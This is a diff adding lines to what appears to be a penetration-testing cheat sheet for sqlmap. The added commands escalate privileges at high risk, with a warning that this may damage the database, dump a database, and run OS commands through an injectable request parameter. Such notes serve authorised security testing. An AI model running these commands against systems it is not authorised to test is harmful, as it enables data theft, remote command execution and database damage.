@@ -1290,6 +1290,15 @@ python /path/to/sqlmap -r req.txt -p param_to_attack1,param2,param3 --dbms=DBMS_
 
 # list available tampers
 python /path/to/sqlmap --list-tampers
+
+# try to priv esc !!risk=3 might damage db!!
+python /path/to/sqlmap -r req.txt -p param_to_attack --level=1 --risk=3 --privesc
+
+# dump database
+python /path/to/sqlmap -r req.txt -p param_to_attack --dump
+
+# execute command
+python /path/to/sqlmap -r req.txt -p param_to_attack --os-cmd=command_here
 ```
 
 
